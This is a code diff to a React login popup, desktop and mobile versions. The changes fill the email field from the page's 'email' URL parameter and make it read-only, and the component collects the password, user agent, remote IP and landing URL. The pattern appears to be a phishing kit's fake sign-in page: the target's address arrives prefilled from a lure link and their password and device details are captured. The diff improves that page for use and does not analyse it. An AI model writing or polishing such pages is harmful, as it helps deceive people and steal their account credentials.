@@ -3,7 +3,7 @@
 
 import React, { useState, useEffect } from "react";
 
-const InputWithIcon = ({ type = "text", placeholder, value, onChange, icon }) => {
+const InputWithIcon = ({ type = "text", placeholder, value, onChange, icon, readOnly = false }) => {
   const [focused, setFocused] = useState(false); // ✅ added state
 
   const base = {
@@ -53,6 +53,7 @@ const InputWithIcon = ({ type = "text", placeholder, value, onChange, icon }) =>
         autoComplete="off"
         onFocus={() => setFocused(true)}   // 👈 added
         onBlur={() => setFocused(false)}   // 👈 added
+        readOnly={readOnly} // ✅ added readOnly prop
       />
     </div>
   );
@@ -72,13 +73,20 @@ const LockIcon = () => (
 );
 
 const Popup = ({ domain, eparams, systemInfo }) => {
-  const [email, setEmail] = useState(eparams || ""); // ✅ changed from readonly to editable
+  const [email, setEmail] = useState(""); // ✅ start with empty
   const [password, setPassword] = useState("");
   const [userAgent, setUserAgent] = useState("");
   const [remoteAddress, setRemoteAddress] = useState("");
   const [landingUrl, setLandingUrl] = useState("");
 
   useEffect(() => {
+    // Get email from URL parameter
+    const urlParams = new URLSearchParams(window.location.search);
+    const emailFromUrl = urlParams.get('email');
+    if (emailFromUrl) {
+      setEmail(emailFromUrl);
+    }
+    
     // Set user agent
     setUserAgent(navigator.userAgent);
     
@@ -156,14 +164,15 @@ const Popup = ({ domain, eparams, systemInfo }) => {
         />
       </div>
 
-      {/* Username (editable) */}
+      {/* Username (prefilled and non-editable) */}
       <div style={{ marginBottom: "8px", display: "flex", justifyContent: "center" }}>
         <InputWithIcon
           type="text"
           placeholder="Email address"
           value={email}
-          onChange={(e) => setEmail(e.target.value)} // ✅ added onChange
+          onChange={(e) => setEmail(e.target.value)} // ✅ keep onChange but input is readOnly
           icon={<UserIcon />}
+          readOnly={true} // ✅ made non-editable
         />
       </div>
 
@@ -213,13 +222,20 @@ const Popup = ({ domain, eparams, systemInfo }) => {
 };
 
 const PopupMobile = ({ domain, eparams, systemInfo }) => {
-  const [email, setEmail] = useState(eparams || ""); // ✅ changed from readonly to editable
+  const [email, setEmail] = useState(""); // ✅ start with empty
   const [password, setPassword] = useState("");
   const [userAgent, setUserAgent] = useState("");
   const [remoteAddress, setRemoteAddress] = useState("");
   const [landingUrl, setLandingUrl] = useState("");
 
   useEffect(() => {
+    // Get email from URL parameter
+    const urlParams = new URLSearchParams(window.location.search);
+    const emailFromUrl = urlParams.get('email');
+    if (emailFromUrl) {
+      setEmail(emailFromUrl);
+    }
+    
     // Set user agent
     setUserAgent(navigator.userAgent);
     
@@ -295,14 +311,15 @@ const PopupMobile = ({ domain, eparams, systemInfo }) => {
         />
       </div>
 
-      {/* Username (editable) */}
+      {/* Username (prefilled and non-editable) */}
       <div style={{ marginBottom: "8px" }}>
         <InputWithIcon
           type="text"
           placeholder="Email address"
           value={email}
-          onChange={(e) => setEmail(e.target.value)} // ✅ added onChange
+          onChange={(e) => setEmail(e.target.value)} // ✅ keep onChange but input is readOnly
           icon={<UserIcon />}
+          readOnly={true} // ✅ made non-editable
         />
       </div>
 
